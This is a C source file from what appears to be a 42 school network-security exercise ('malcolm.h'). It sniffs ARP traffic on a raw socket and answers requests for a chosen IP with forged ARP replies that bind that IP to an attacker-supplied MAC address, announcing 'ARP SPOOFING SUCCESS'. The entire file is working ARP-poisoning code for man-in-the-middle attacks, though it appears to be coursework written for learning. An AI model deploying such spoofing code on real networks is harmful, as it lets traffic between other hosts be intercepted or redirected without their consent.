/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   sniffer.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eric <eric@student.42.fr>                  +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/17 13:53:15 by eric              #+#    #+#             */
/*   Updated: 2026/04/17 17:13:23 by eric             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "malcolm.h"

void	sniff_arp(int sockfd, const char *iface, const t_arp *spoofed_arp)
{
	u_int8_t	buffer[BUFFER_SIZE];
	ssize_t		len;

	while (1)
	{
		printf("Waiting for packets\n");
		len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, NULL, NULL);
		// printf("Received: %ld bytes\n", len);
		if (len <= 0)
			continue;
		//1. Verifier taille minimal Ethernet
		if ((size_t)len < sizeof(t_ethernet))
			continue;
		//2 Lire header
		t_ethernet *eth = (t_ethernet *)buffer;
		//3. Verifier si ARP
		if (ntohs(eth->type) != 0x0806)
			continue;
		printf ("ARP packet detected\n");
		if ((size_t)len < sizeof(t_ethernet) + sizeof(t_arp))
			continue;
		t_arp *arp = (t_arp *)(buffer + sizeof(t_ethernet));
		printf("Sender MAC: ");
		print_mac(arp->sender_mac);
		printf(" | Sender IP: ");
		print_ip(arp->sender_ip);
		printf("\nTarget IP: ");
		print_ip(arp->target_ip);
		printf(" ");
		if (ntohs(arp->opcode) == ARP_REQUEST)
		{
			// Only respond if target IP matches the spoofed IP
			if (memcmp(arp->target_ip, spoofed_arp->sender_ip, 4) == 0)
			{
				printf("-> ARP REQUEST (RESPONDING)\n");
				send_arp_reply(sockfd, iface, arp, spoofed_arp);
				break ;
			}
			else
				printf("-> ARP REQUEST (IGNORED)\n");
		}
		else if (ntohs(arp->opcode) == ARP_REPLY)
			printf("-> ARP REPLY\n");
		else
			printf("-> UNKNOWN\n");
		// sleep(1);
	}
}

int	send_arp_reply(int sockfd, const char *iface, t_arp *arp, const t_arp *spoofed_arp)
{
	uint8_t		buffer[sizeof(t_arp) + sizeof(t_ethernet)];
	t_ethernet	*eth;
	t_arp		*reply;

	eth = (t_ethernet *)buffer;
	reply = (t_arp *)(buffer + sizeof(t_ethernet));

	ft_memcpy(eth->dst_mac, arp->sender_mac, 6);
	ft_memcpy(eth->src_mac, spoofed_arp->sender_mac, 6);
	eth->type = htons(0x0806);
	
	reply->htype = htons(1);
	reply->ptype = htons(0x0800);
	reply->hlen = 6;
	reply->plen = 4;
	reply->opcode = htons(2);

	// Sender of reply = spoofed MAC/IP
	ft_memcpy(reply->sender_mac, spoofed_arp->sender_mac, 6);
	ft_memcpy(reply->sender_ip, spoofed_arp->sender_ip, 4);
	// Target of reply = sender of request
	ft_memcpy(reply->target_mac, arp->sender_mac, 6);
	ft_memcpy(reply->target_ip, arp->sender_ip, 4);

	struct sockaddr_ll sll;
	ft_memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = if_nametoindex(iface);
	if (sll.sll_ifindex == 0)
	{
		fprintf(stderr, "if_nametoindex failed\n");
		return (-1);
	}
	sll.sll_halen = 6;
	ft_memcpy(sll.sll_addr, reply->target_mac, 6);

	if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
	{
		fprintf(stderr, "Error in sendto\n");
		return (-1);
	}
	printf("\n===== ARP SPOOFING SUCCESS =====\n");
	printf("Told ");
	print_ip(arp->sender_ip);
	printf(" that ");
	print_ip(spoofed_arp->sender_ip);
	printf(" is at ");
	print_mac(spoofed_arp->sender_mac);
	printf("\n================================\n\n");
	return (0);
}
